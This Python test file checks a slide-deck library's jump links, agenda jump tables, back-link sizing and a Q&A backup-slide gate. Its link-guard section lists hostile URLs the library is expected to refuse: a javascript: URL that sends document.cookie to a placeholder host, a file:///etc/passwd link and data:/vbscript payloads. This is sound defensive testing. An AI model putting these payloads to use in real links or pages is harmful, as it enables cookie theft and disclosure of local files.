#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A deck that cannot JUMP has no backup slides — only slides nobody will reach.

Parking prepared answers after the close is ordinary practice in every room this skill builds for.
It works only if the speaker can jump to one while the room watches, and get back. Measured before
this suite: `grep -rn hlinkClick scripts/` found the string only in `_EA_FOLLOWERS`, a constant listing
XML element order, and `click_action` appeared nowhere — the library could not make a deck jump at all, so every "backup
slide" it ever built was reachable only by arrowing past everything in between.

So two things are pinned here, and the second is the one that binds:
  * the COMPONENTS — `link` (shape -> slide, shape/run -> URL, scheme-guarded), `agenda`
    (a contents page that is also a jump table), `back_link` (the other half of a jump);
  * the GATE — `content.qa` names the question and the slide that answers it, and the BUILT file
    is checked for a real slide action pointing there. Anticipating questions stays a practice,
    not a law: nothing recorded is NOT CHECKED, out loud.

Jumps are verified after SAVE AND REOPEN, never on the in-memory object: a relationship that
python-pptx holds and does not serialise would pass any check made before the file is written.

Run: python3 tests/test_qa_backup.py
"""
from __future__ import annotations

import _hermetic  # noqa: F401,E402 — never read the user's own taste.md / taste ledger
import pathlib
import sys
import tempfile
import warnings

HERE = pathlib.Path(__file__).resolve().parent
SKILL = HERE.parent
sys.path.insert(0, str(SKILL / "scripts"))
warnings.simplefilter("ignore")

import check_qa_backup as cqb                                             # noqa: E402
import deckkit as dk                                                      # noqa: E402
from pptx import Presentation                                             # noqa: E402
from pptx.dml.color import RGBColor                                       # noqa: E402

OK, BAD = [], []
TMP = pathlib.Path(tempfile.mkdtemp(prefix="qabackup-"))
INK = RGBColor(0x22, 0x22, 0x22)


def ck(cond, msg, detail=""):
    (OK if cond else BAD).append(msg)
    print(("  ok   " if cond else "  ✗    ") + msg + (("  — %s" % (detail,)) if detail and not cond else ""))


def blank(n):
    prs = dk.blank_deck()
    sl = [prs.slides.add_slide(prs.slide_layouts[6]) for _ in range(n)]
    for i, s in enumerate(sl, 1):
        dk.text(s, 0.7, 0.7, 8.6, 0.9, [[("Slide %d" % i, 24, INK, True, False, dk.FONT)]])
    return prs, sl


def saved(prs, name):
    p = TMP / name
    prs.save(str(p))
    return str(p)


print("— the jump itself, read back out of the SAVED file")
prs, sl = blank(6)
chip = dk.box(sl[1], 0.7, 4.2, 2.2, 0.4, fill=None, line=INK, line_w=0.8, round=True, r=0.2)
dk.link(chip, sl[4])                                   # slide 2 -> slide 5
dk.back_link(sl[4], sl[1], label="Back to results")    # slide 5 -> slide 2
path = saved(prs, "wired.pptx")
jumps = cqb.jump_map(Presentation(path))
ck(jumps == {2: {5}, 5: {2}},
   "a shape jump and a back link SURVIVE save/reopen and read back as slide numbers — checked on "
   "the reopened file, because a relationship python-pptx holds but never serialises would pass "
   "any check made before the save", jumps)

print("\n— the link guard: a deck's targets come from its material, and material is untrusted")
_p, _s = blank(2)
for url in ("https://doi.org/10.1000/xyz", "http://example.org", "mailto:a@b.org", "doi:10.1000/xyz"):
    try:
        dk.link(dk.box(_s[0], 1, 1, 1, 0.3), url)
        ck(True, "a real citation target is accepted: %s" % url)
    except Exception as exc:
        ck(False, "a real citation target is accepted: %s" % url, exc)
for url in ("javascript:fetch('http://x/'+document.cookie)", "file:///etc/passwd",
            "data:text/html;base64,PHNjcmlwdD4=", "vbscript:msgbox", "  JavaScript:alert(1)"):
    try:
        dk.link(dk.box(_s[0], 1, 1, 1, 0.3), url)
        ck(False, "REFUSED: %r" % url[:34], "it was accepted")
    except ValueError as exc:
        ck("not an allowed link target" in str(exc),
           "REFUSED: %r — a delivered deck runs on someone else's machine" % url[:34], exc)
_run_shape = dk.text(_s[0], 1, 2, 3, 0.4, [[("see the paper", 12, INK, False, False, dk.FONT)]])
_run = _run_shape.text_frame.paragraphs[0].runs[0]
dk.link(_run, "https://doi.org/10.1000/xyz")
ck(_run.hyperlink.address == "https://doi.org/10.1000/xyz",
   "a text RUN can carry a URL — that is how a citation on a slide becomes clickable")
try:
    dk.link(_run, _s[1])
    ck(False, "a run asked for a slide JUMP is refused", "it silently did nothing")
except ValueError as exc:
    ck("has to hang off a shape" in str(exc),
       "a run asked for a slide JUMP is REFUSED with the shape it needs — PowerPoint has no "
       "run-level jump, and silently doing nothing is how a dead contents page ships", exc)

print("\n— agenda(): a contents page that is also a jump table")
_p2, _s2 = blank(5)
items = ["Where we were", "What changed", "What it cost", "What to decide"]
dk.agenda(_s2[0], 0.7, 1.7, 5.4, items, active=1, targets=[_s2[1], _s2[2], _s2[3], _s2[4]])
_jm = cqb.jump_map(Presentation(saved(_p2, "agenda.pptx")))
ck(_jm.get(1) == {2, 3, 4, 5},
   "every row jumps to its own slide, after save/reopen — an agenda you can present FROM", _jm)
try:
    dk.agenda(_s2[0], 0.7, 1.7, 5.4, items, targets=[_s2[1], _s2[2]])
    ck(False, "a HALF-wired agenda is refused", "two targets for four rows was accepted")
except ValueError as exc:
    ck("one target per row" in str(exc),
       "a HALF-wired agenda is REFUSED — the row that does nothing is the one you click live", exc)

print("\n— back_link(): the width is MEASURED, in whichever script the label is written in")
_p3, _s3 = blank(2)
w = {}
for lab in ("Back", "Back to agenda", "返回目录", "返回重建质量对比页"):
    w[lab] = dk.back_link(_s3[1], _s3[0], label=lab).width / 914400.0
ck(w["Back to agenda"] > w["Back"] + 0.4,
   "a longer Latin label gets a wider chip — the fixed 1.25in pill wrapped 'Back to agenda' "
   "through the chip's own bottom edge, which is this library's own rule applied to itself", w)
ck(w["返回目录"] > w["Back"] + 0.15,
   "🔴 four CJK glyphs are WIDER than four Latin letters — a CJK glyph is full-width (1em) and the "
   "chrome face is Latin, so measuring the caption in one face priced 返回目录 exactly like 'Back' "
   "(0.50in both) and the chip came out too small for it", w)
ck(w["返回重建质量对比页"] > w["返回目录"] + 0.6,
   "...and the CJK measurement SCALES with the label, so it is metrics and not a constant", w)
_sw, _sh = dk._slide_size(_s3[0])
for script, lab in (("Latin", "x" * 200), ("CJK", "返回" * 120)):
    try:
        dk.back_link(_s3[1], _s3[0], label=lab)
        ck(False, "%s: a label too long for the canvas is refused" % script,
           "it was clamped and left to overflow")
    except ValueError as exc:
        ck("would run out through the chip" in str(exc) and "whole canvas" in str(exc),
           "%s: a label too long for the CANVAS is REFUSED with both widths — the caption is set "
           "unwrapped, so clamping the chip silently runs the text off the slide" % script, exc)
try:
    dk.back_link(_s3[1], _s3[0], label="Back to the reconstruction quality comparison", w=1.0)
    ck(False, "an explicit width too small for the label is refused", "accepted")
except ValueError as exc:
    ck("needs" in str(exc) and "1.00in" in str(exc),
       "...and an explicit `w` too small for its label is refused the same way, naming both numbers")

print("\n— the gate, against a real built deck")
REC = [{"question": "Why not compressed sensing as the baseline?", "slide": 5}]
finds, facts = cqb.check(path, REC)
ck(finds == [] and facts["slides"] == 6,
   "a prepared question whose slide can be reached AND left is clean", finds)
finds, _f = cqb.check(path, REC + [{"question": "What is the failure mode at 12x?", "slide": 6}])
ck(any(s == "block" and c == "PREPARED BUT UNREACHABLE" and "slide 6" in m for s, c, m in finds),
   "🔴 a backup slide NOTHING links to BLOCKS — it is the exact deck this gate exists for: the "
   "answer was written, and during questions it cannot be got to", finds)
ck(any("dk.link" in m for _s, c, m in finds if c == "PREPARED BUT UNREACHABLE"),
   "...and the finding names the call that fixes it, so the author acts instead of reading")
finds, _f = cqb.check(path, [{"question": "q", "slide": 19}])
ck(any(s == "block" and c == "NO SLIDE" for s, c, m in finds),
   "a question pointing past the end of the deck blocks — the appendix that was cut", finds)
finds, _f = cqb.check(path, [{"question": "", "slide": 5}])
ck(any(c == "NO QUESTION" for _s, c, _m in finds),
   "a slide recorded without its question is a finding — the QUESTION is the part that gets "
   "rehearsed, and a bare slide number records nothing about the room", finds)
for val in (True, False):
    finds, _f = cqb.check(path, [{"question": "q", "slide": val}])
    ck(any(c == "NO SLIDE" for _s, c, _m in finds),
       "🔴 a JSON %s is not slide 1 — `isinstance(True, int)` is True in Python, so a boolean "
       "would silently become a real slide number, checked against a real deck, and wrong"
       % str(val).lower(), finds)
finds, _f = cqb.check(path, ["slide 5"])
ck(any(c == "MALFORMED" for _s, c, _m in finds),
   "a malformed entry is reported, not crashed on — a gate that dies on a typo is a gate the "
   "author disables", finds)

prs2 = Presentation(path)
dk.link(dk.box(list(prs2.slides)[1], 3.2, 4.2, 2.2, 0.4, fill=None, line=INK, line_w=0.8,
               round=True, r=0.2), list(prs2.slides)[5])
dead_end = saved(prs2, "deadend.pptx")
finds, facts = cqb.check(dead_end, REC + [{"question": "What is the failure mode at 12x?", "slide": 6}])
ck([f for f in finds if f[0] == "block"] == [] and any(c == "NO WAY BACK" for _s, c, _m in finds),
   "a backup you can reach and cannot LEAVE is a NOTE, not a block — the room watches you arrow "
   "backwards, which is bad and is not a broken deck", finds)

print("\n— what it refuses to answer, and what a waiver does")
for arg in (None, []):
    try:
        cqb.check(path, arg)
        ck(False, "NOT CHECKED when no questions were recorded", "it returned a verdict")
    except RuntimeError as exc:
        ck("content.qa" in str(exc) and "practice, not a law" in str(exc),
           "NOT CHECKED when no questions were recorded (%r) — and the message says WHY the gate "
           "does not demand them, so nobody records an empty list to clear a red light" % (arg,))
_fw, _factsw = cqb.check(path, REC + [{"question": "q", "slide": 19}],
                         waive="slide 19 lives in the appendix deck we hand out, not in this file")
ck(_factsw.get("waived") and [f for f in _fw if f[0] == "block"],
   "a written waiver does not delete the finding — it is recorded beside it, like every other "
   "floor in this skill")

print("\n— both runtimes run it, and the record carries the questions across")
import check_gate_parity as gp                                            # noqa: E402
ck("qa_backup" in gp.RECORD_FED,
   "qa_backup is declared RECORD-FED, so parity demands tests/test_schema_reach.py prove both "
   "runtimes' records can be READ — being called on both paths is not the same thing")
_shared = (SKILL / "scripts" / "render_deck.py").read_text(encoding="utf-8")
_codex = (SKILL / "scripts" / "codex_delivery_gate.py").read_text(encoding="utf-8")
ck("_gate_section('qa_backup')" in _shared and "def check_qa_backup" in _codex,
   "the gate is wired on the shared path and the Codex path")
for name, src in (("shared", _shared), ("codex", _codex)):
    ck("dk.link" in src and "qa_backup" in src and "waived" in src,
       "%s: its message names the call that fixes it and the waiver, so the fix shape travels "
       "with the finding" % name)
for name, f in (("shared", "deck_gates.py"), ("codex", "codex_delivery_gate.py")):
    src = (SKILL / "scripts" / f).read_text(encoding="utf-8")
    ck('"qa": []' in src and "check_qa_backup" in src,
       "%s: the --init scaffold SHOWS the field and names the gate that reads it — a field the "
       "scaffold omits is one nobody fills" % name)
_sigs = (SKILL / "scripts" / "sigs.py").read_text(encoding="utf-8")
ck("agenda" in _sigs and "back_link" in _sigs,
   "the navigation components have runnable scaffolds in sigs.py, so `--example agenda` hands "
   "back a working call instead of an invitation to hand-roll one")

print()
print("%d passed, %d failed" % (len(OK), len(BAD)))
raise SystemExit(1 if BAD else 0)
